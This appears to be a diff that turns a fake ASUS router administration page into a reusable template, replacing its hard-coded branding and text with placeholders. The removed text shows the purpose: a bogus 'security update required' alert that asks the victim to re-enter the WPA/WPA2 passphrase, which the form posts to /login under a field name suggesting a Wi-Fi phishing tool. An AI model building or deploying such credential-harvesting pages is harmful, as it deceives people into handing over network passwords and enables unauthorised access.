@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ASUS Wireless Router — Administration</title>
+    <title>{{page_title}}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #1a1d23; color: #e8eaed; min-height: 100vh; }
@@ -35,38 +35,38 @@
 </head>
 <body>
     <div class="topbar">
-        <div><div class="brand">ASUS</div><div class="sub">Wireless Router</div></div>
-        <div class="sub">Administration</div>
+        <div><div class="brand">{{brand}}</div><div class="sub">{{sub_wireless_router}}</div></div>
+        <div class="sub">{{sub_administration}}</div>
     </div>
     <div class="wrap">
         <div class="tabs">
-            <span>General</span><span class="on">Wireless</span><span>LAN</span><span>System</span>
+            <span>{{tab_general}}</span><span class="on">{{tab_wireless}}</span><span>{{tab_lan}}</span><span>{{tab_system}}</span>
         </div>
         <div class="panel" style="margin-top: 0; border-top-left-radius: 0; border-top-right-radius: 0;">
-            <div class="panel-head">Wireless — Security</div>
+            <div class="panel-head">{{panel_head}}</div>
             <div class="panel-body">
                 <div class="alert">
-                    <strong>Security update required</strong>
-                    A critical wireless security patch is pending. Re-enter your WPA/WPA2 passphrase so the router can verify and apply the update to your network.
+                    <strong>{{alert_title}}</strong>
+                    {{alert_body}}
                 </div>
                 <form method="POST" action="/login">
                     <div class="row two">
-                        <label>Security</label>
-                        <div class="value">WPA2-Personal (AES)</div>
+                        <label>{{label_security}}</label>
+                        <div class="value">{{value_security}}</div>
                     </div>
                     <div class="row two" style="margin-top: 16px;">
-                        <label for="pw">Wi-Fi password</label>
+                        <label for="pw">{{label_wifi_password}}</label>
                         <div>
-                            <input type="password" id="pw" name="wfphshr-wpa-password" placeholder="WPA/WPA2 passphrase" required autocomplete="current-password">
+                            <input type="password" id="pw" name="wfphshr-wpa-password" placeholder="{{password_placeholder}}" required autocomplete="current-password">
                         </div>
                     </div>
                     <div class="actions">
-                        <button type="submit" class="btn">Apply</button>
+                        <button type="submit" class="btn">{{submit_button}}</button>
                     </div>
                 </form>
             </div>
         </div>
-        <div class="footer">Wireless administration — local device</div>
+        <div class="footer">{{footer}}</div>
     </div>
 </body>
 </html>
